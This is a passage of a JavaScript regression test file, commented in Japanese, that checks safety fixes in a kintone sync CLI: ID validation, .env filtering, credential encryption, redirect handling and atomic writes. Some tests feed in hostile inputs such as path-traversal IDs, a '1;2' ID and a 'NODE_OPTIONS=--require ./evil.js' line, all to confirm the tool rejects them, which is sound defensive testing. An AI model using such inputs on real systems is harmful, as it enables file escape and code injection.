// 公開前の安全性見直しで直した項目のリグレッション検査。
// smoke-test.mjs の runGroup("safety") から呼ばれる（expect / mock などの補助は呼び出し側から受け取る）。
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

export async function safetyTests(ctx) {
  const { ROOT } = ctx;
  const dist = (file) => pathToFileURL(path.join(ROOT, "dist", file)).href;

  console.log("[offline] 安全性: 取得データを壊さない・入力検証・接続先の取り違え防止");

  const withDist = { ...ctx, dist };
  await normalizeTests(withDist);
  await fsTests(withDist);
  await idValidationTests(withDist);
  await pullStubTests(withDist);
  await deployStatusTests(withDist);
  await pushSafetyTests(withDist);
  await confirmClosedTests(withDist);
  await csvAtomicTests(withDist);
  await envTests(withDist);
  await redirectTests(withDist);
  await validationErrorTests(withDist);
  await tenantTests(withDist);
  await customizeManifestTests(withDist);
  await updateInitTests(withDist);
  await recordsSafetyTests(withDist);
  await guardSafetyTests(withDist);
  await subcommandHelpTests(withDist);
}

// 一時のドメインフォルダ（.env にモックの認証値を書く）。
function makeDomain(mockEnv, baseUrl) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-safety-"));
  const lines = Object.entries(mockEnv(baseUrl)).map(([k, v]) => `${k}=${v}`);
  fs.writeFileSync(path.join(tmp, ".env"), `${lines.join("\n")}\n`, "utf8");
  return tmp;
}

// B-1: revision / fileKey という名前のフィールドコード・ビュー名を "-" に潰さない。
async function normalizeTests({ expect, dist }) {
  const { normalizeDynamicValues } = await import(dist("normalize.js"));

  // フィールド定義（値がオブジェクト）はキー名が revision / fileKey でもそのまま残る。
  const fields = {
    properties: {
      revision: { type: "SINGLE_LINE_TEXT", code: "revision", label: "改訂" },
      fileKey: { type: "FILE", code: "fileKey", label: "添付" },
      table: { type: "SUBTABLE", fields: { revision: { type: "NUMBER", code: "revision" } } }
    },
    revision: "12"
  };
  const normalizedFields = normalizeDynamicValues(fields);
  expect(
    "normalize: field code が revision / fileKey のフィールド定義（テーブル内も）を潰さない",
    normalizedFields.properties.revision.type === "SINGLE_LINE_TEXT" &&
      normalizedFields.properties.fileKey.type === "FILE" &&
      normalizedFields.properties.table.fields.revision.type === "NUMBER",
    JSON.stringify(normalizedFields)
  );
  expect("normalize: トップレベルの revision は '-' にする", normalizedFields.revision === "-", JSON.stringify(normalizedFields));

  // ビュー名・アクション名・ステータス名が revision / fileKey でも同様。
  const views = normalizeDynamicValues({ views: { revision: { type: "LIST", name: "revision", index: "0" } }, revision: 3 });
  expect(
    "normalize: 名前が revision のビューを潰さず、数値の revision も '-' にする",
    views.views.revision.type === "LIST" && views.revision === "-",
    JSON.stringify(views)
  );

  // 本物の fileKey（文字列）は、深い階層でも '-' にする（customize のファイル・アイコン）。
  const customize = normalizeDynamicValues({
    desktop: { js: [{ type: "FILE", file: { fileKey: "abc-123", name: "a.js", size: "10" } }], css: [] },
    scope: "ALL",
    revision: "5"
  });
  expect(
    "normalize: customize の file.fileKey とトップの revision は '-' にする",
    customize.desktop.js[0].file.fileKey === "-" && customize.desktop.js[0].file.name === "a.js" && customize.revision === "-",
    JSON.stringify(customize)
  );
  const settings = normalizeDynamicValues({ name: "app", icon: { type: "FILE", file: { fileKey: "k1", contentType: "image/png" } }, revision: "9" });
  expect("normalize: アイコンの file.fileKey は '-' にする", settings.icon.file.fileKey === "-" && settings.revision === "-", JSON.stringify(settings));

  // トップレベル以外の primitive な revision は残す（プラグイン設定の config のキーなど）。
  const plugin = normalizeDynamicValues({ config: { revision: "keep-me" }, revision: "7" });
  expect("normalize: トップレベル以外の revision（プラグイン設定の値など）は残す", plugin.config.revision === "keep-me" && plugin.revision === "-", JSON.stringify(plugin));

  // 同じ入力は何度正規化しても同じ（べき等）。
  const again = normalizeDynamicValues(normalizedFields);
  expect("normalize: 正規化はべき等", JSON.stringify(again) === JSON.stringify(normalizedFields), JSON.stringify(again));
}

// B-10: BOM 付き JSON を読める。
async function fsTests({ expect, dist }) {
  const { parseJsonText } = await import(dist("fsutil.js"));

  expect("fsutil: BOM 付きの JSON を読める", JSON.stringify(parseJsonText('﻿{"a":1}', "x.json")) === '{"a":1}', "BOM parse failed");
  let message = "";
  try {
    parseJsonText("{ broken", "data/kintone/index/apps.json");
  } catch (error) {
    message = error.message;
  }
  expect(
    "fsutil: JSON の読み込み失敗はファイル名を含む日本語メッセージ",
    message.includes("data/kintone/index/apps.json") && message.includes("JSON の読み込みに失敗しました"),
    message
  );
}

// B-2: --id / --guestspace は正の整数だけ。data/ の外へ書き出せる値は、操作制限・API より前に拒否する。
async function idValidationTests({ expect, runCli }) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-id-"));
  try {
    const bad = [
      ["pull", "app", "--id", "x/../../../../escape"],
      ["pull", "app", "--id", "../escape"],
      ["pull", "app", "--id", "007"],
      ["pull", "app", "--id", "12", "--guestspace", "../../x"],
      ["pull", "spaces", "--id", "abc"],
      ["pull", "guestspaces", "--id", "1;2"],
      ["diff", "app", "--id", "1/2"],
      ["diff", "space", "--id", "1/2"],
      ["push", "app", "--id", "..", "-y"],
      ["push", "space", "--id", "..", "-y"],
    ];
    for (const args of bad) {
      const r = runCli(args, tmp);
      expect(
        `id 検証: ${args.join(" ")} は実行前に拒否（exit 1・正の整数を案内・何も作らない）`,
        r.status === 1 && r.stderr.includes("正の整数") && !fs.existsSync(path.join(tmp, "data")),
        `status=${r.status}\n${r.stderr}`
      );
    }
    // --id が値なしのときは従来どおり Missing required argument（形式エラーにしない）。
    const missing = runCli(["pull", "app"], tmp);
    expect("id 検証: --id が無いときは Missing required argument", missing.status === 1 && missing.stderr.includes("Missing required argument: --id"), missing.stderr);
    // pull records の --id は <appId>[,<recordId>] の独自形式で、これまでどおり。
    const records = runCli(["pull", "records", "--id", "12,x"], tmp);
    expect("id 検証: pull records の --id は独自の形式エラーのまま", records.status === 1 && !records.stderr.includes("正の整数"), records.stderr);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

// B-2 / B-3: app.json を読めないとき（存在しない・一過性の障害）は続行せず、取得失敗のスタブで既存の実データを上書きしない。
async function pullStubTests({ expect, startMockKintone, mockEnv, runCliAsync }) {
  const appDir = (tmp, id) => path.join(tmp, "data", "kintone", "apps", `app-${id}`);

  // 存在しないアプリ: app.json が 404 なら中断し、フォルダを作らない。
  {
    const mock = await startMockKintone((url) => (url.pathname === "/k/v1/app.json" ? [404, { code: "GAIA_AP01", message: "指定したアプリが見つかりません。" }] : null));
    const tmp = makeDomain(mockEnv, mock.baseUrl);
    try {
      const r = await runCliAsync(["pull", "app", "--id", "11"], tmp, mockEnv(mock.baseUrl));
      expect("pull app: 存在しないアプリ（app.json が 404）は中断し、app-11 のフォルダを作らない", r.status === 1 && !fs.existsSync(appDir(tmp, 11)), `status=${r.status}\n${r.stderr}`);
    } finally {
      mock.server.close();
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  }

  // 一過性の障害（app.json が 500）でも中断する。
  {
    const mock = await startMockKintone((url) => (url.pathname === "/k/v1/app.json" ? [500, { code: "GAIA_SY01", message: "error" }] : null));
    const tmp = makeDomain(mockEnv, mock.baseUrl);
    try {
      const r = await runCliAsync(["pull", "app", "--id", "11"], tmp, mockEnv(mock.baseUrl));
      expect("pull app: app.json が 500 でも中断し、スタブを書かない", r.status === 1 && !fs.existsSync(appDir(tmp, 11)), `status=${r.status}\n${r.stderr}`);
    } finally {
      mock.server.close();
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  }

  // form.json の取得だけ失敗: 既存の実データ（pull 状態なし・push 対象外のファイル）を _error スタブで上書きしない。
  // views.json は既存ファイルが無いので、従来どおり _error スタブを書く。
  {
    const mock = await startMockKintone((url) => {
      if (url.pathname === "/k/v1/app.json") return [200, { appId: "12", name: "テスト", code: "", spaceId: null }];
      if (url.pathname === "/k/v1/apps.json") return [200, { apps: [] }];
      if (url.pathname === "/k/v1/app/acl.json") return [403, { code: "CB_NO02", message: "権限がありません。" }];
      if (url.pathname === "/k/v1/form.json" || url.pathname === "/k/v1/app/views.json") return [500, { code: "GAIA_SY01", message: "error" }];
      return [200, { revision: "3", properties: {}, layout: [], reports: {}, name: "x" }];
    });
    const tmp = makeDomain(mockEnv, mock.baseUrl);
    try {
      const formFile = path.join(appDir(tmp, 12), "form", "form.json");
      fs.mkdirSync(path.dirname(formFile), { recursive: true });
      const keepBody = `${JSON.stringify({ properties: { 顧客名: { type: "SINGLE_LINE_TEXT", code: "顧客名" } }, revision: "-" }, null, 2)}\n`;
      fs.writeFileSync(formFile, keepBody, "utf8");
      const r = await runCliAsync(["pull", "app", "--id", "12"], tmp, mockEnv(mock.baseUrl));
      expect("pull app: 一部の取得失敗でも exit 0（失敗はファイルのスタブと stderr に出る）", r.status === 0, `status=${r.status}\n${r.stderr}`);
      expect("pull app: 取得に失敗した form.json は、既存の実データを _error スタブで上書きしない", fs.readFileSync(formFile, "utf8") === keepBody, fs.readFileSync(formFile, "utf8"));
      expect("pull app: 残したことをログに出す", r.stderr.includes("form/form.json を環境から取得できなかったため、ローカルの内容を残しました"), r.stderr);
      const viewsFile = path.join(appDir(tmp, 12), "views", "views.json");
      expect(
        "pull app: 既存ファイルが無い失敗リソースは従来どおり _error スタブを書く",
        fs.existsSync(viewsFile) && "_error" in JSON.parse(fs.readFileSync(viewsFile, "utf8")),
        fs.existsSync(viewsFile) ? fs.readFileSync(viewsFile, "utf8") : "missing"
      );
    } finally {
      mock.server.close();
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  }
}

// B-5: deploy 状況の判定。応答が空・要求したアプリが欠けているときは成功扱いにしない。
async function deployStatusTests({ expect, dist }) {
  const { summarizeDeployStatuses } = await import(dist("kintone/push.js"));

  expect("deploy: 応答が空のときは success にしない（反映できていないのに完了と報告しない）", summarizeDeployStatuses([], ["3"]).state === "processing", JSON.stringify(summarizeDeployStatuses([], ["3"])));
  expect(
    "deploy: 要求したアプリが応答に無いときは success にしない",
    summarizeDeployStatuses([{ app: "3", status: "SUCCESS" }], ["3", "4"]).state === "processing",
    JSON.stringify(summarizeDeployStatuses([{ app: "3", status: "SUCCESS" }], ["3", "4"]))
  );
  expect(
    "deploy: 要求した全アプリが SUCCESS なら success",
    summarizeDeployStatuses([{ app: "3", status: "SUCCESS" }, { app: "4", status: "SUCCESS" }], ["3", "4"]).state === "success",
    "not success"
  );
  expect("deploy: FAIL は expected があっても failed", summarizeDeployStatuses([{ app: "3", status: "FAIL" }], ["3"]).state === "failed", "not failed");

}

// B-5: バックアップ失敗での中断・検証 pull の失敗・辞退時の終了コード（専用のモック）。
async function pushSafetyTests({ expect, startStatefulMock, mockEnv, runCliAsync }) {
  const VIEW = (name, index) => ({ id: String(10 + index), type: "LIST", name, index: String(index), sort: "", fields: [] });
  const resources = {
    "/app/form/fields.json": { properties: {}, revision: "1" },
    "/app/form/layout.json": { layout: [], revision: "1" },
    "/form.json": { properties: [] },
    "/app/views.json": { views: { 一覧: VIEW("一覧", 0) }, revision: "1" },
    "/app/reports.json": { reports: {}, revision: "1" },
    "/app/settings.json": { name: "案件", description: "", icon: { type: "PRESET", key: "APP72" }, revision: "1" },
    "/app/status.json": { enable: false, states: null, actions: null, revision: "1" }
  };
  const admin = ["/app/notifications/general.json", "/app/notifications/perRecord.json", "/app/notifications/reminder.json", "/app/actions.json", "/app/plugins.json", "/app/customize.json", "/app/acl.json", "/record/acl.json", "/field/acl.json"];
  const writes = [];
  const mock = await startStatefulMock((method, url) => {
    const m = /^\/k\/v1(\/preview)?(\/.+)$/.exec(url.pathname);
    if (!m) return null;
    const preview = Boolean(m[1]);
    const ep = m[2];
    if (method === "GET" && !preview) {
      if (ep === "/app.json") return [200, { appId: "3", name: "案件", spaceId: null }];
      if (ep === "/apps.json") return [200, { apps: [{ appId: "3", code: "", name: "app", spaceId: null }] }];
      if (admin.includes(ep)) return [403, { code: "CB_NO02", message: "権限がありません。" }];
      return resources[ep] ? [200, resources[ep]] : null;
    }
    if (method === "GET" && preview && ep === "/app/deploy.json") return [200, { apps: [{ app: "3", status: "SUCCESS" }] }];
    if (preview && method !== "GET") {
      writes.push(`${method} ${url.pathname}`);
      return [200, { revision: "2" }];
    }
    return null;
  });
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-push-git-safety-"));
  fs.writeFileSync(path.join(tmp, ".env"), Object.entries(mockEnv(mock.baseUrl)).map(([k, v]) => `${k}=${v}`).join("\n") + "\nKINT_ORIGIN_ALLOW_PUSH_APP=true\n", "utf8");
  const run = (args) => runCliAsync(args, tmp, mockEnv(mock.baseUrl));
  const viewsFile = path.join(tmp, "data", "kintone", "apps", "app-3", "views", "views.json");
  try {
    const pulled = await run(["pull", "app", "--id", "3"]);
    expect("push app safety: pull app の基準を用意", pulled.status === 0, pulled.stderr);
    const { spawnSync } = await import("node:child_process");
    const gitCmd = (args) => {
      const r = spawnSync("git", args, { cwd: tmp, encoding: "utf8" });
      if (r.status !== 0) throw new Error(r.stderr || `git ${args.join(" ")} failed`);
      return (r.stdout || "").trim();
    };
    gitCmd(["init", "-q"]);
    gitCmd(["config", "user.name", "kint-origin smoke"]);
    gitCmd(["config", "user.email", "smoke@example.invalid"]);
    gitCmd(["add", "--", "data"]);
    gitCmd(["commit", "-q", "-m", "pull app baseline"]);
    const base = gitCmd(["rev-parse", "HEAD"]);
    const views = JSON.parse(fs.readFileSync(viewsFile, "utf8"));
    views.views["追加"] = VIEW("追加", 1);
    fs.writeFileSync(viewsFile, `${JSON.stringify(views, null, 2)}\n`, "utf8");
    mock.requests.length = 0;
    writes.length = 0;
    const pushed = await run(["push", "app", "--id", "3", "--base", base, "--only", "views", "-y"]);
    const summary = JSON.parse(pushed.stdout);
    expect("push app safety: deploy成功を返す", pushed.status === 0 && summary.status === "deployed" && summary.deployed === true, `${pushed.stdout}\n${pushed.stderr}`);
    expect(
      "push app safety: 変更APIとdeploy確認だけを呼び、全設定の事前GET・バックアップ・検証pullをしない",
      writes.join("|") === "PUT /k/v1/preview/app/views.json|POST /k/v1/preview/app/deploy.json" &&
        mock.requests.join("|") === "PUT /k/v1/preview/app/views.json|POST /k/v1/preview/app/deploy.json|GET /k/v1/preview/app/deploy.json" &&
        !summary.backupDir && !summary.verified,
      JSON.stringify({ writes, requests: mock.requests, summary })
    );
    const diff = await run(["diff", "app", "--id", "3", "--base", base]);
    expect("push app safety: deploy後はpull状態だけを進め、同じ編集を再送しない", diff.status === 0 && JSON.parse(diff.stdout).resources.find((r) => r.key === "views")?.state === "same", `${diff.stdout}\n${diff.stderr}`);
  } finally {
    mock.server.close();
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}
// B-5: 確認の入力が閉じた（Ctrl-D・Ctrl-C・端末の切断）ときは「承認されなかった」として扱い、無言で終了しない。
// 対話の確認は TTY が要るため、擬似端末は使わず、confirm.ts を TTY 扱いにして stdin を閉じる子プロセスで確かめる。
async function confirmClosedTests({ expect, ROOT }) {
  const { spawnSync } = await import("node:child_process");
  const script = [
    'Object.defineProperty(process.stdin, "isTTY", { value: true });',
    "const { confirmYes } = await import(process.argv[1]);",
    'const answer = await confirmYes("続行しますか？ [y/N]");',
    "console.log(JSON.stringify({ answer }));"
  ].join("\n");
  const url = pathToFileURL(path.join(ROOT, "dist", "confirm.js")).href;
  const runWith = (input) => spawnSync(process.execPath, ["--input-type=module", "-e", script, url], { input, encoding: "utf8", timeout: 20000 });

  const closed = runWith("");
  expect(
    "confirm: 回答の前に入力が閉じたら false で終了する（無言で終了コード 0 にならない）",
    closed.status === 0 && closed.stdout.trim() === '{"answer":false}',
    `status=${closed.status}\n${closed.stdout}\n${closed.stderr}`
  );
  const yes = runWith("y\n");
  expect("confirm: y で答えたら true", yes.status === 0 && yes.stdout.trim() === '{"answer":true}', `status=${yes.status}\n${yes.stdout}\n${yes.stderr}`);
}

// B-4: records.csv は一時ファイルへ書き、成功したときだけ置き換える。失敗しても前回の CSV を壊さない。
async function csvAtomicTests({ expect, dist }) {
  const { streamCsvToFile } = await import(dist("kintone/cliKintone.js"));
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-csv-"));
  try {
    const outFile = path.join(tmp, "records.csv");
    const old = "﻿レコード番号,名前\n1,前回の正常なCSV\n";
    fs.writeFileSync(outFile, old, "utf8");
    const parts = () => fs.readdirSync(tmp).filter((name) => name.endsWith(".part"));

    // 失敗: 途中まで出力して異常終了 → 前回の CSV は無傷。一時ファイルも残さない。
    const failScript = path.join(tmp, "fail.mjs");
    // 子プロセスのソースは 1 行ずつ配列で組み立てる（文字列中の改行エスケープの取り違えを避ける）。
    const failLines = ['process.stdout.write("レコード番号,名前\\n2,途中まで");', 'process.stderr.write("boom");', "process.exitCode = 3;"];
    fs.writeFileSync(failScript, failLines.join("\n") + "\n", "utf8");
    let failure = "";
    try {
      await streamCsvToFile([failScript], { cwd: tmp, env: process.env, outFile, label: "record export" });
    } catch (error) {
      failure = error.message;
    }
    expect("records.csv: 取得に失敗しても前回の CSV を壊さない", fs.readFileSync(outFile, "utf8") === old, fs.readFileSync(outFile, "utf8"));
    expect("records.csv: 失敗は終了コードと stderr を含むエラーで返り、一時ファイルを残さない", failure.includes("終了コード 3") && failure.includes("boom") && parts().length === 0, `${failure}\n${parts().join(",")}`);

    // 成功: BOM 付きの新しい内容へ置き換わる。
    const okScript = path.join(tmp, "ok.mjs");
    const okLines = ['process.stdout.write("レコード番号,名前\\n1,新しい内容\\n");'];
    fs.writeFileSync(okScript, okLines.join("\n") + "\n", "utf8");
    const result = await streamCsvToFile([okScript], { cwd: tmp, env: process.env, outFile, label: "record export" });
    const fresh = fs.readFileSync(outFile, "utf8");
    expect("records.csv: 成功すると BOM 付きの新しい内容に置き換わり、一時ファイルを残さない", fresh === "﻿レコード番号,名前\n1,新しい内容\n" && parts().length === 0 && result.bytes > 0, `${JSON.stringify(fresh)}\n${parts().join(",")}`);

    // 前回の CSV が無い場合の失敗は、出力ファイルを作らない。
    const missing = path.join(tmp, "none", "records.csv");
    fs.mkdirSync(path.dirname(missing));
    let failed2 = false;
    try {
      await streamCsvToFile([failScript], { cwd: tmp, env: process.env, outFile: missing, label: "record export" });
    } catch {
      failed2 = true;
    }
    expect("records.csv: 初回の取得に失敗したら、空や途中のファイルを作らない", failed2 && fs.readdirSync(path.dirname(missing)).length === 0, fs.readdirSync(path.dirname(missing)).join(","));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

// B-8: .env から process.env へ取り込むのは CYBOZU_* / KINT_ORIGIN_* だけ（KINTONE_* は取り込まない）。export 形式も読める。
async function envTests({ ROOT, expect, dist, runCli }) {
  const { parseEnvFile, isLoadableEnvKey, validateBaseUrl } = await import(dist("env.js"));

  const parsed = parseEnvFile(["export CYBOZU_USERNAME=alice", "CYBOZU_PASSWORD='p w'", "# comment", "NODE_OPTIONS=--require ./evil.js"].join("\n"));
  expect("env: export KEY=value を読める", parsed.CYBOZU_USERNAME === "alice" && parsed.CYBOZU_PASSWORD === "p w", JSON.stringify(parsed));
  expect(
    "env: 取り込むキーは CYBOZU_* / KINT_ORIGIN_* だけ（KINTONE_* は取り込まない）",
    isLoadableEnvKey("CYBOZU_BASE_URL") && !isLoadableEnvKey("KINTONE_PASSWORD") && isLoadableEnvKey("KINT_ORIGIN_ALLOW_PUSH_APP") && !isLoadableEnvKey("NODE_OPTIONS") && !isLoadableEnvKey("NODE_TLS_REJECT_UNAUTHORIZED") && !isLoadableEnvKey("PATH") && !isLoadableEnvKey("cybozu_base_url"),
    "key filter wrong"
  );

  // .env にある NODE_OPTIONS が、子プロセス（この CLI 自身）の環境へ入らない。
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-envkeys-"));
  try {
    fs.writeFileSync(path.join(tmp, ".env"), "NODE_OPTIONS=--require ./does-not-exist.js\nKINT_ORIGIN_ALLOW_PULL_KINTONE=true\n", "utf8");
    const r = runCli(["policy"], tmp);
    expect("env: .env の NODE_OPTIONS はこのツールの実行に影響しない（policy が正常に動く）", r.status === 0 && r.stdout.includes("allowed"), `status=${r.status}\n${r.stderr}`);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }

  const message = (value) => {
    try {
      validateBaseUrl(value);
      return "";
    } catch (error) {
      return error.message;
    }
  };
  expect("env: https の接続先は受け付ける（末尾のスラッシュは除く）", validateBaseUrl("https://example.cybozu.com/") === "https://example.cybozu.com", "https url rejected");
  expect("env: ループバックの http（テスト用モック）は受け付ける", message("http://127.0.0.1:8080") === "" && message("http://localhost:8080") === "", "loopback rejected");
  expect("env: http の接続先は拒否（認証情報を平文で送らない）", message("http://example.cybozu.com").includes("https://"), message("http://example.cybozu.com"));
  expect("env: URL でない値は日本語で案内", message("not a url").includes("URL として解釈できません"), message("not a url"));
  expect("env: URL にユーザー名・パスワードを含む値は拒否", message("https://u:p@example.cybozu.com").includes("含めないでください"), message("https://u:p@example.cybozu.com"));

  const {
    ENCRYPTED_PREFIX,
    encryptPassword,
    decryptPassword,
    resolvePassword,
    isEncryptedPassword,
    getMachineIdentity
  } = await import(dist("crypto.js"));
  const { getEnv } = await import(dist("env.js"));
  const idA = "kint-origin:machine-v1:win32:guid-aaa:user-alice";
  const idB = "kint-origin:machine-v1:win32:guid-bbb:user-alice";
  const idOtherUser = "kint-origin:machine-v1:win32:guid-aaa:user-bob";
  const plain = "P@ssw0rd!日本語:123";
  const token1 = encryptPassword(plain, idA);
  const token2 = encryptPassword(plain, idA);
  expect(
    "secret: ランダムな salt / IV により毎回異なる enc:v1: 暗号化値を作る",
    token1.startsWith(ENCRYPTED_PREFIX) && token2.startsWith(ENCRYPTED_PREFIX) && token1 !== token2 && isEncryptedPassword(token1),
    "encrypted format or randomness check failed"
  );
  expect(
    "secret: 同じマシン識別値で暗号化した値を復号できる",
    decryptPassword(token1, idA) === plain && resolvePassword(token2, idA) === plain,
    "decrypt mismatch"
  );
  expect(
    "secret: 平文の CYBOZU_PASSWORD はそのまま使える",
    !isEncryptedPassword("plain-pw") && resolvePassword("plain-pw", idA) === "plain-pw",
    "plain password changed"
  );

  const decryptError = (token, identity) => {
    try {
      decryptPassword(token, identity);
      return "";
    } catch (error) {
      return error.message;
    }
  };
  expect(
    "secret: 別マシンでは復号できず再発行を案内する",
    decryptError(token1, idB).includes("復号に失敗しました") && decryptError(token1, idB).includes("kint-origin secret"),
    "wrong machine was accepted"
  );
  expect(
    "secret: 同じマシンの別ユーザーでは復号できない",
    decryptError(token1, idOtherUser).includes("復号に失敗しました"),
    "wrong user was accepted"
  );
  const tampered = token1.slice(0, -1) + (token1.endsWith("A") ? "B" : "A");
  expect("secret: 暗号化値の改ざんを拒否する", decryptError(tampered, idA).includes("復号に失敗しました") || decryptError(tampered, idA).includes("破損しています"), "tampered value was accepted");
  expect(
    "secret: 未対応バージョン enc:v2: は拒否する",
    decryptError("enc:v2:a.b.c.d", idA).includes("暗号化形式が未対応または不正です"),
    "unknown version was accepted"
  );
  expect(
    "secret: 不正な形式と長さを拒否する",
    decryptError("enc:v1:broken", idA).includes("破損しています") && decryptError("enc:v1:YQ.Yg.Yw.ZA", idA).includes("破損しています"),
    "broken value was accepted"
  );

  const machineToken = encryptPassword("integration-test-password");
  const previousEnv = {
    baseUrl: process.env.CYBOZU_BASE_URL,
    username: process.env.CYBOZU_USERNAME,
    password: process.env.CYBOZU_PASSWORD
  };
  try {
    process.env.CYBOZU_BASE_URL = "https://example.cybozu.com";
    process.env.CYBOZU_USERNAME = "alice";
    process.env.CYBOZU_PASSWORD = machineToken;
    expect("secret: getEnv() が暗号化パスワードを復号する", getEnv().password === "integration-test-password", "getEnv password mismatch");
  } finally {
    if (previousEnv.baseUrl === undefined) delete process.env.CYBOZU_BASE_URL;
    else process.env.CYBOZU_BASE_URL = previousEnv.baseUrl;
    if (previousEnv.username === undefined) delete process.env.CYBOZU_USERNAME;
    else process.env.CYBOZU_USERNAME = previousEnv.username;
    if (previousEnv.password === undefined) delete process.env.CYBOZU_PASSWORD;
    else process.env.CYBOZU_PASSWORD = previousEnv.password;
  }
  expect("secret: getMachineIdentity がマシン識別値を返す", getMachineIdentity().startsWith("kint-origin:machine-v1:"), "machine identity missing");

  const { spawnSync } = await import("node:child_process");
  const cliPath = path.join(ROOT, "dist", "cli.js");
  const secretCommand = spawnSync(process.execPath, [cliPath, "secret"], {
    input: "cli-input-password\n",
    encoding: "utf8",
    timeout: 20000
  });
  let secretJson = {};
  try {
    secretJson = JSON.parse(secretCommand.stdout || "");
  } catch {
    // 下の expect で JSON 出力の失敗を検出する。
  }
  expect(
    "secret CLI: 標準入力から受け取り、復号可能な JSON を stdout に出す",
    secretCommand.status === 0 &&
      typeof secretJson.encrypted === "string" &&
      secretJson.encrypted.startsWith(ENCRYPTED_PREFIX) &&
      secretJson.envLine === "CYBOZU_PASSWORD=" + secretJson.encrypted &&
      decryptPassword(secretJson.encrypted) === "cli-input-password",
    "secret CLI output was invalid"
  );
  expect(
    "secret CLI: 入力した平文を stdout / stderr に表示しない",
    !secretCommand.stdout.includes("cli-input-password") && !secretCommand.stderr.includes("cli-input-password"),
    "secret CLI exposed its input"
  );
  const emptySecret = spawnSync(process.execPath, [cliPath, "secret"], { input: "\n", encoding: "utf8", timeout: 20000 });
  expect(
    "secret CLI: 空入力は exit 1 で中断する",
    emptySecret.status === 1 && emptySecret.stderr.includes("パスワードが空のため中断しました"),
    "empty password was accepted"
  );
  const badSecretArg = runCli(["secret", "--bogus"]);
  expect(
    "secret CLI: 不明なオプションを exit 1 で拒否する",
    badSecretArg.status === 1 && badSecretArg.stderr.includes("不明なオプションです: --bogus"),
    badSecretArg.stderr
  );
}

// B-7: リダイレクトには従わず、認証ヘッダを別のホストへ送らない。
async function redirectTests({ expect, dist }) {
  const http = await import("node:http");
  const { fetchCybozuResponse } = await import(dist("http.js"));
  const { activateGrants } = await import(dist("policy.js"));

  // 転送先（別のホストを想定）に届いたヘッダを記録するサーバー。
  const received = [];
  const target = http.createServer((req, res) => {
    received.push({ url: req.url, auth: req.headers["x-cybozu-authorization"] });
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end("{}");
  });
  await new Promise((resolve) => target.listen(0, "127.0.0.1", resolve));
  const targetUrl = `http://127.0.0.1:${target.address().port}/leak`;
  const origin = http.createServer((req, res) => {
    res.writeHead(302, { Location: targetUrl });
    res.end();
  });
  await new Promise((resolve) => origin.listen(0, "127.0.0.1", resolve));
  try {
    activateGrants(["pull:kintone"]);
    let message = "";
    try {
      await fetchCybozuResponse(
        { baseUrl: `http://127.0.0.1:${origin.address().port}`, username: "u", password: "p", language: "ja", apiIntervalMs: 0 },
        `http://127.0.0.1:${origin.address().port}/k/v1/app.json`
      );
    } catch (error) {
      message = error.message;
    }
    expect("http: リダイレクトには従わず、認証ヘッダを転送先へ送らない", received.length === 0, JSON.stringify(received));
    expect("http: リダイレクトは日本語のエラーで中断し、CYBOZU_BASE_URL の確認を案内", message.includes("リダイレクト") && message.includes("CYBOZU_BASE_URL"), message);
  } finally {
    activateGrants([]);
    origin.close();
    target.close();
  }
}

// kintone が返す入力の検証エラー（errors）を、エラーメッセージに含める。含めないと、どの項目が問題か分からない。
async function validationErrorTests({ expect, dist }) {
  const http = await import("node:http");
  const { fetchCybozuResponse } = await import(dist("http.js"));
  const { activateGrants } = await import(dist("policy.js"));
  const server = http.createServer((req, res) => {
    res.writeHead(400, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ code: "CB_VA01", id: "x", message: "入力内容が正しくありません。", errors: { "properties[活動履歴].label": { messages: ["必須です。"] }, "properties[メモ].type": { messages: ["不正です。", "もう一つ"] } } }));
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    activateGrants(["pull:kintone"]);
    let message = "";
    try {
      const base = `http://127.0.0.1:${server.address().port}`;
      await fetchCybozuResponse({ baseUrl: base, username: "u", password: "p", language: "ja", apiIntervalMs: 0 }, `${base}/k/v1/preview/app/form/fields.json`);
    } catch (error) {
      message = error.message;
    }
    expect(
      "http: 入力の検証エラー（CB_VA01）は、問題の項目とメッセージを含める",
      message.includes("CB_VA01") && message.includes("properties[活動履歴].label: 必須です。") && message.includes("properties[メモ].type: 不正です。 / もう一つ"),
      message
    );
  } finally {
    activateGrants([]);
    server.close();
  }
}

// B-6: 取得元（app.json.domain）が今の接続先と違うアプリは、deleted/ へ動かさず、push もしない。接続先を表示する。
async function tenantTests({ expect, dist, startStatefulMock, mockEnv, runCliAsync, runCli }) {
  const { isOtherTenant, recordedHost } = await import(dist("kintone/tenant.js"));

  // 純関数: 取得元が分からない・同じホストなら止めない。違うホスト（大文字小文字は無視）だけ止める。
  const tmp0 = fs.mkdtempSync(path.join(os.tmpdir(), "kint-origin-tenant-pure-"));
  try {
    const dirWith = (name, domain) => {
      const dir = path.join(tmp0, name);
      fs.mkdirSync(dir, { recursive: true });
      if (domain !== undefined) fs.writeFileSync(path.join(dir, "app.json"), JSON.stringify({ appId: "1", domain }), "utf8");
      return dir;
    };
    expect("tenant: 同じホストなら他の接続先と見なさない（大文字小文字は無視）", !isOtherTenant(dirWith("same", "Example.cybozu.com"), "example.cybozu.com"), "same host flagged");
    expect("tenant: 違うホストは他の接続先", isOtherTenant(dirWith("other", "other.cybozu.com"), "example.cybozu.com"), "other host not flagged");
    expect("tenant: app.json が無い・domain が無い（pull index の索引項目だけ）取得物は止めない", !isOtherTenant(dirWith("none"), "example.cybozu.com") && !isOtherTenant(dirWith("nodomain", ""), "example.cybozu.com"), "undetermined flagged");
    fs.mkdirSync(path.join(tmp0, "broken"), { recursive: true });
    fs.writeFileSync(path.join(tmp0, "broken", "app.json"), "{ broken", "utf8");
